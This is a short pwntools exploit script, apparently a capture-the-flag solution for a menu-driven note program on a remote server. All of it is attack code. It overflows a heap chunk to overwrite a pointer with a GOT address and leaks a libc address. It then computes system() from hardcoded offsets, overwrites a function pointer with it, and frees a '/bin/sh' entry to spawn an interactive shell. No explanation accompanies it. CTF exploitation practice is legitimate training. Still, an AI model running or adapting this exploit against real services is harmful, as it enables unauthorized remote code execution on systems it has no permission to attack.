from pwn import *

r = remote("112.166.114.143", 317)
#r = remote("192.168.146.128",9623)
def Add(data):
    r.sendlineafter("> ","1")
    r.sendafter("content: ",str(data))
    r.recvuntil("fully.\n")
def Show():
    r.sendlineafter("> ","2")
    return r.recvuntil("1. add")[:-6]
def Delete(i):
    r.sendlineafter("> ","3")
    r.sendlineafter("deleted: ",str(i))
    r.recvuntil("fully.\n")
def Modify(i,data):
    r.sendlineafter("> ","4")
    r.sendlineafter("modify: ",str(i))
    r.sendafter("content: ",str(data))
    r.recvuntil("fully.\n")
Add("asdf")
Add("qwer")
Add("/bin/sh")
Delete(0)
Add("A"*0x60+"B"*0x18+p32(0x602018))
K = Show()
libc = u64(K[K.find("[1111638594] - ")+15:K.find("[1111638594] - ")+21]+"\x00\x00") - 0x83A70
system = libc + 0x45380
Modify(1,p64(system))
r.sendlineafter("> ","3")
r.sendlineafter("deleted: ",str(2))
r.interactive()
